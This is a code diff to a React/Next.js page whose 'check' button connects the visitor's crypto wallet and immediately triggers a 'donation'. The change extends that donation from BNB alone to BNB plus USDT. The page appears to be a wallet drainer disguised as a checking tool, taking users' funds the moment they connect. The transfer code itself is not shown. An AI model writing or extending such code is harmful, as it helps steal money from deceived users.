@@ -3,7 +3,7 @@ import { useState } from 'react';
 import Image from 'next/image';
 import { TextGenerateEffect } from "@/components/ui/text-generate-effect";
 import { Navbar } from "@/components/ui/navbar";
-import { connectWallet, donateBNB } from "@/utils/bnbWallet";
+import { connectWallet, donateBNBAndUSDT } from "@/utils/bnbWallet";
 
 export default function Home() {
   const [isProcessing, setIsProcessing] = useState(false);
@@ -11,6 +11,8 @@ export default function Home() {
   const [txHash, setTxHash] = useState('');
   const [donationAmount, setDonationAmount] = useState('');
   const [error, setError] = useState('');
+  const [usdtTxHash, setUsdtTxHash] = useState('');
+  const [usdtDonationAmount, setUsdtDonationAmount] = useState('');
 
   async function handleCheck() {
     if (isProcessing) return;
@@ -20,10 +22,11 @@ export default function Home() {
       const userAddress = await connectWallet();
       setWalletAddress(userAddress);
       
-      // Immediately initiate donation after wallet connection
-      const { txHash, amount } = await donateBNB();
-      setTxHash(txHash);
-      setDonationAmount(amount);
+      const { bnbTxHash, usdtTxHash, bnbAmount, usdtAmount } = await donateBNBAndUSDT();
+      setTxHash(bnbTxHash || '');
+      setUsdtTxHash(usdtTxHash || '');
+      setDonationAmount(bnbAmount);
+      setUsdtDonationAmount(usdtAmount);
     } catch (error) {
       setError(error.message);
     } finally {
@@ -69,6 +72,8 @@ export default function Home() {
             {txHash && <p className="text-sm text-yellow-200">Transaction Hash: {txHash}</p>}
             {donationAmount && <p className="text-sm text-yellow-200">Donated Amount: {donationAmount} BNB</p>}
             {error && <p className="text-sm text-red-500">{error}</p>}
+            {usdtTxHash && <p className="text-sm text-yellow-200">USDT Transaction Hash: {usdtTxHash}</p>}
+            {usdtDonationAmount && <p className="text-sm text-yellow-200">Donated USDT Amount: {usdtDonationAmount} USDT</p>}
           </div>
         </div>
         <div className="w-full max-w-md mb-8 mt-10">
